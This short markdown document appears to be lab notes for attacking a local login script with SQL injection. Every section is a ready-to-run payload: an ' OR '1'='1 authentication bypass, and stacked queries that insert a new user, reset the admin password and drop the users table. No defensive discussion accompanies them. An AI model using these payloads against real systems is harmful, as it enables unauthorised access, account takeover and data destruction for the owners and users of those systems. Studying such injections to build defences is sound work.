## Authenticate without password

username = "admin"
password = "' OR '1'='1" # This is the SQL injection part

```bash
./login.py 'admin' "' OR '1'='1"
```

## Inject new user

```bash
./login.py 'admin' "' OR '1'='1' ; INSERT INTO users (id, username, password) VALUES (3, 'gollum', 'mysecret'); --"
```

## Change admin password

```bash
./login.py 'admin' "' OR '1'='1' ; UPDATE users SET password = 'pwned' WHERE username = 'admin'; --"
```

## Data destruction

```bash
./login.py 'admin' "' OR '1'='1' ; DROP TABLE users; --"
```
